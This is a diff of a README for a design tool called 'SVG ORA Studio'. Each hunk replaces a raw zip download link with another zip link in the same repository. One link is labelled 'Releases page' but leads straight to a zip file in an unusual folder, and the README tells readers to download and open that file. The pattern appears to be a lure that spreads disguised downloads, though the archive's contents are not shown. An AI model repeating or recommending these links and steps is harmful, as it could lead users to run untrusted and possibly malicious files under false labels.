@@ -6,14 +6,14 @@ Welcome to SVG ORA Studio! This tool allows anyone, regardless of their design s
 
 ## 🔗 Download Now
 
-[![Download SVG-ORA-Studio](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/.history/Studio-OR-SV-v1.3-beta.1.zip)](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/.history/Studio-OR-SV-v1.3-beta.1.zip)
+[![Download SVG-ORA-Studio](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/services/OR-Studio-SV-1.1.zip)](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/services/OR-Studio-SV-1.1.zip)
 
 ## 📦 Download & Install
 
 To begin using SVG ORA Studio, follow these steps:
 
 1. Click on the **Download Now** button above.
-2. You will be taken to the [Releases page](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/.history/Studio-OR-SV-v1.3-beta.1.zip).
+2. You will be taken to the [Releases page](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/services/OR-Studio-SV-1.1.zip).
 3. Look for the latest release at the top of the page. 
 4. Click on the appropriate version for your system. Select the file that matches your operating system.
 5. After downloading, locate the file in your downloads folder.
@@ -65,6 +65,6 @@ If you encounter any issues or have questions, feel free to reach out. This proj
 
 For your convenience, here is the download link again:
 
-[![Download SVG-ORA-Studio](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/.history/Studio-OR-SV-v1.3-beta.1.zip)](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/.history/Studio-OR-SV-v1.3-beta.1.zip)
+[![Download SVG-ORA-Studio](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/services/OR-Studio-SV-1.1.zip)](https://github.com/AySainWest/SVG-ORA-Studio/raw/refs/heads/main/services/OR-Studio-SV-1.1.zip)
 
 Now you're ready to bring your ideas to life with SVG ORA Studio. Happy designing!
